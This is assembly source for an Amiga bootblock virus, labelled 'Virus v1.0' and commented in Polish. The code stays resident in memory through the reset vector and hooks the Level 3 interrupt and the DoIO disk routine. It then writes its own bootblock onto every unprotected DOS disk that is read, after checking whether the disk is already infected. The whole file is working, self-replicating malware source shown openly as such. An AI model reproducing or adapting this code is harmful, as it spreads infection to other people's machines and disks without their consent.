* Virus v1.0

;	includes:
;	-auto memory alloc for itself at each reset
;	-new Level 3 handler
;	-new DoIO handler
;	-checks if dos disk before installing
;	-checks if previously installed
;	-installs at every reset with unprotected disk in boot drive
;	-


CoolCapture	=	46

DoIO		=	-456

ln_type		=	$8
ln_Pri		=	$9
mn_ReplyPort	=	$e
mp_SigTask	=	$10
io_Command	=	$1c
io_Actual	=	$20
io_Length	=	$24
io_Data		=	$28
io_Offset	=	$2c


Bootblock:

	dc.b	'DOS',0

BootCheckSum:

	dc.l	0,0
	
	bsr.b	ResetProc

	lea	DosName(pc),a1		;normalny boot systemu
	move.l	$4.w,a6
	jsr	-$60(a6)
	tst.l	d0
	beq.b	NoExitPos	
	move.l	d0,a0
	move.l	$16(a0),a0
	moveq	#0,d0
	rts
NoExitPos:
	moveq	#-1,d0
	rts		

Start:
	move.l	4.w,a6
	lea	ResetProc(pc),a1
	cmp.l	CoolCapture(a6),a1
	beq.b	CoolSet
	move.l	a1,CoolCapture(a6)
	bsr.w	CalcCheckSum
CoolSet:rts

ResetProc:
	movem.l	a0-a6/d0-d7,-(sp)

	move.l	4.w,a6			;alokacja pamieci

	move.l	#$400,d0
	moveq	#2,d1
	jsr	-$c6(a6)
	lea	Bootblock(pc),a0
	clr.l	Counter-Bootblock(a0)	;czyszczenie licznika czasu

	tst.l	d0
	beq.b	Quit
	move.l	d0,a1
	cmp.l	a1,a0
	beq.b	RunIn
	move.l	#$3ff,d7		;przenoszenie w nowy obszar
Remove:	move.b	(a0)+,(a1)+
	dbra	d7,Remove

	move.l	d0,a1
	move.l	a1,-(sp)
	jsr	Start-Bootblock(a1)	;ustaw nowy wektor resetu i policz
	move.l	(sp)+,a1		;sume kontrolna z nowego miejsca

RunIn:	jmp	Runner-Bootblock(a1)	;skocz do inicjalizacji przerwan
					;i DoIO z nowego miejsca

Runner:	lea	Bootblock(pc),a0
	move.l	a0,BootblockAdr-Bootblock(a0)

	move.l	$4.w,a6			;nowe DoIO...
	lea	DoIO+2(a6),a6
	lea	OrigDoIOJMP+2(pc),a0
	move.l	(a6),(a0)
	lea	NewDoIO(pc),a0
	move.l	a0,(a6)

	lea	Interrupts(pc),a0	;wlaczenie przerwan
	move.w	$dff01c,d0
	move.w	#$7fff,$dff09a
	move.l	$6c.w,next-interrupts+2(a0)
	move.l	a0,$6c.w
	bset.l	#15,d0
	move.w	d0,$dff09a
quit:	movem.l	(sp)+,a0-a6/d0-d7
	rts


CalcCheckSum:
	lea	34(a6),a1		;ustawianie sumy kontrolnej
	clr.w	d0
	moveq	#23,d1
Loop:	add.w	(a1)+,d0
	dbra	d1,Loop
	not.w	d0
	move.w	d0,(a1)
	rts

Interrupts:
	movem.l	d0-d7/a0-a6,-(sp)

	lea	counter(pc),a0		;procedurka zlosliwa
	addq.b	#1,(a0)
	cmp.b	#100,(a0)
	bne.b	NotThisTime
	clr.b	(a0)
	bsr.w	Start
NotThisTime:


noyet:	movem.l	(sp)+,d0-d7/a0-a6
next:	jmp	0.l


NewDoIO:
	cmp.l	#$400,io_Length(a1)		;czy dwa sektory
	bne.w	OrigDoIOJMP

	cmp.l	io_Data(a1),a4			;czy to bootowanie?
	bne.b	OrigDoIOJMP
	clr.l	(a4)
	bsr.b	OrigDoIOJMP

	cmp.l	#'DOS '&$ffffff00,(a4)		;czy dysk w dos'ie?
	bne.b	NoDosDisk

	move.l	OrigDoIOJMP+2(pc),DoIO+2(a6)	;normalne DoIO
	
	move.l	BootCheckSum(pc),d0		;czy to moze nasz bootblock?
	cmp.l	4(a4),d0
	beq.b	AlreadyInstalled

	movem.l	a0-a6,-(sp)
	move.l	a1,a4

	move.w	#1,io_Command(a1)		;reset stacji dyskow
	jsr	DoIO(a6)

	move.l	a4,a1				;zapis bootblocku
	move.w	#$3,io_Command(a1)
	move.l	#$400,io_Length(a1)
	move.l	BootblockAdr(pc),io_Data(a1)
	clr.l	io_Offset(a1)
	move.l	$4.w,a6
	jsr	DoIO(a6)

	move.l	a4,a1				;zapis wszystkich buforow
	move.w	#$4,io_Command(a1)
	move.l	$4.w,a6
	jsr	DoIO(a6)

	lea	Counter(pc),a4
	clr.b	(a4)
	move.l	4.w,a6
	clr.l	CoolCapture(a6)
	bsr.w	CalcCheckSum

	movem.l	(sp)+,a0-a6
	move.l	a4,io_Data(a1)


AlreadyInstalled:
NoDosDisk:

	rts

OrigDoIOJMP:
	jmp	0.l

DosName:	dc.b	'dos.library',0
Counter:	dc.l	0
BootBlockAdr:	dc.l	0

End:
blk.b	$400,0
